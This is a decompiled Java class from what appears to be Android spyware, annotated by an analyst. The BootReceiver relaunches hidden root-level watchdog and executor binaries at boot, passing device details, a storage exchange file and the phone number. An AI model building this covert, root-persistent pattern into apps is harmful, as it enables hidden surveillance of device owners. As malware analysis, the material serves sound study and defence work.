package com.p003fa.p004c;

/* renamed from: com.fa.c.BootReceiver */
/** ANAL: BootReceiver class
 *
 * - Not rooted:
 *   - launch SystemService
 * - Rooted:
 *   - Relaunch watchdog and appsexec executables (see ANAL RootCommandExecutor for breakdown)
 */
public class BootReceiver extends android.content.BroadcastReceiver {
    public void onReceive(android.content.Context context, android.content.Intent intent) {
        int type = com.p003fa.p004c.Utilities.GetInstallType(context.getApplicationContext());
        if (type == 0) {
            context.startService(new android.content.Intent(context.getApplicationContext(), com.p003fa.p004c.SystemService.class));
        } else if (type == 1) {
            try {
                if (com.p003fa.p004c.RootUtil.isDeviceRooted() && !new com.p003fa.p004c.ExecuteAsRootOnStart(context).execute()) {
                    java.lang.Runtime.getRuntime().exec("/data/" + com.p003fa.p004c.Utilities.GetWatchDogName(context.getApplicationContext()) + " " + com.p003fa.p004c.Utilities.GetDeviceInfoCommandLineArgs(context.getApplicationContext()) + " /data/" + com.p003fa.p004c.Utilities.GetExecName(context.getApplicationContext()) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExchangeFileName(context.getApplicationContext()) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + " " + com.p003fa.p004c.Utilities.GetPhoneNumber(context));
                }
            } catch (java.lang.Exception e) {
                android.util.Log.d("CPS", e.getMessage());
                try {
                    java.lang.Runtime.getRuntime().exec("/data/" + com.p003fa.p004c.Utilities.GetWatchDogName(context.getApplicationContext()) + " " + com.p003fa.p004c.Utilities.GetDeviceInfoCommandLineArgs(context.getApplicationContext()) + " /data/" + com.p003fa.p004c.Utilities.GetExecName(context.getApplicationContext()) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExchangeFileName(context.getApplicationContext()) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + " " + com.p003fa.p004c.Utilities.GetPhoneNumber(context));
                } catch (java.lang.Exception e2) {
                    android.util.Log.d("CPS", e.getMessage());
                }
            }
        } else {
            android.util.Log.d("CPS", "NOT INSTALLED");
        }
    }
}
